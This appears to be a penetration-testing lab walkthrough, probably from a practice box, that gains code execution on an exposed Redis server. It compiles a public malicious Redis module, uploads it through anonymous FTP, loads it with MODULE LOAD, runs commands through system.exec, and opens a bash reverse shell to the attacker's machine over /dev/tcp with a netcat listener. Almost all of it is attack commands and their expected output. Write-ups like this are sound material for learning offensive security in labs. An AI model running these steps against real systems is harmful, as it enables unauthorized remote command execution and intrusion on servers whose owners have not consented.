#### ==🔵Redis== 

Build a malicious Redis module

On Kali:
```
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
```
Navigate into the directory:
```
cd RedisModules-ExecuteCommand
```
Compile the module:
```
make
```
The compiled shared object is:
```
src/module.so
```
Copy it into the current directory:
```
cp src/module.so .
```


==🔴IF ERROR : ==
Fix the missing headers
You're already inside:
```
~/Downloads/RedisModules-ExecuteCommand
```
Open the source file:
```
nano src/module.c
```
At the beginning, you'll see existing includes similar to:
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
```
Add the missing headers:
```
#include <string.h>
#include <arpa/inet.h>
```
Save
Compile again
Run:
```
make clean
make
```
If `make clean` isn't supported, simply run:
```
make
```
If compilation succeeds, you should see `module.so`.


Upload the module through anonymous FTP
Connect again:
```
ftp $IP
```
Navigate to the writable directory:
```
cd pub
```
Upload the module:
```
put module.so
```
Expected output:
```
226 Transfer complete.
```
With the default vsftpd directory configuration, the uploaded file should be accessible at:
```
/var/ftp/pub/module.so
```
This path must be verified if the configuration differs.

Load the malicious module into Redis
Connect to Redis:
```
telnet $IP 6379
```
Execute:
```
MODULE LOAD /var/ftp/pub/module.so
```
Expected response:
```
+OK
```
The malicious module is now loaded into Redis.

Execute commands through Redis
Test command execution:
```
system.exec "id"
```
Expected output:
```
uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)
```
Initial access obtained
We have command execution as the user `pablo`.

Obtain a reverse shell
On Kali, start a listener:
```
rlwrap -cAr nc -lvnp 6379
```
From the Redis connection, execute:
```
system.exec "bash -i >& /dev/tcp/<KALI IP>/6379 0>&1"
```
Replace `ATTACKER_IP` with your Kali VPN IP.
Verify access:
```
id
whoami
```
